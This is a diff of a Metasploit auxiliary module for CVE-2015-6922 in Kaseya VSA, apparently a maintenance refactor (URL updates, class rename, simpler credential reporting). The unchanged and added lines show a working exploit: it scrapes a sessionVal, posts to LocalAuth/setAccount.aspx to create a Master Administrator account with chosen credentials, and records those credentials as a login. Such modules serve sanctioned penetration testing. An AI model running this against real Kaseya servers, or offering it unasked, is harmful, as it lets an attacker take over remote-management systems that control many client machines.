@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -30,7 +27,7 @@ class Metasploit3 < Msf::Auxiliary
           ['CVE', '2015-6922'],
           ['ZDI', '15-448'],
           ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/kaseya-vsa-vuln-2.txt'],
-          ['URL', 'http://seclists.org/bugtraq/2015/Sep/132']
+          ['URL', 'https://seclists.org/bugtraq/2015/Sep/132']
         ],
       'DisclosureDate' => 'Sep 23 2015'))
 
@@ -40,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('KASEYA_USER', [true, 'The username for the new admin account', 'msf']),
         OptString.new('KASEYA_PASS', [true, 'The password for the new admin account', 'password']),
         OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])
-      ], self.class)
+      ])
   end
 
 
@@ -53,11 +50,11 @@ class Metasploit3 < Msf::Auxiliary
     if res && res.body && res.body.to_s =~ /ID="sessionVal" name="sessionVal" value='([0-9]*)'/
       session_val = $1
     else
-      print_error("#{peer} - Failed to get sessionVal")
+      print_error("Failed to get sessionVal")
       return
     end
 
-    print_status("#{peer} - Got sessionVal #{session_val}, creating Master Administrator account")
+    print_status("Got sessionVal #{session_val}, creating Master Administrator account")
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'LocalAuth', 'setAccount.aspx'),
@@ -73,35 +70,21 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     unless res && res.code == 302 && res.body && res.body.to_s.include?('/vsapres/web20/core/login.asp')
-      print_error("#{peer} - Master Administrator account creation failed")
+      print_error("Master Administrator account creation failed")
       return
     end
 
-    print_good("#{peer} - Master Administrator account with credentials #{datastore['KASEYA_USER']}:#{datastore['KASEYA_PASS']} created")
-    service_data = {
-      address: rhost,
-      port: rport,
-      service_name: (ssl ? 'https' : 'http'),
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
+    print_good("Master Administrator account with credentials #{datastore['KASEYA_USER']}:#{datastore['KASEYA_PASS']} created")
 
-    credential_data = {
-      origin_type: :service,
-      module_fullname: self.fullname,
-      private_type: :password,
-      private_data: datastore['KASEYA_PASS'],
-      username: datastore['KASEYA_USER']
-    }
-
-    credential_data.merge!(service_data)
-    credential_core = create_credential(credential_data)
-    login_data = {
-      core: credential_core,
-      access_level: 'Master Administrator',
-      status: Metasploit::Model::Login::Status::UNTRIED
-    }
-    login_data.merge!(service_data)
-    create_credential_login(login_data)
+    connection_details = {
+        module_fullname: self.fullname,
+        username: datastore['KASEYA_USER'],
+        private_data: datastore['KASEYA_PASS'],
+        private_type: :password,
+        workspace_id: myworkspace_id,
+        access_level: 'Master Administrator',
+        status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_details)
+    create_credential_and_login(connection_details)
   end
 end
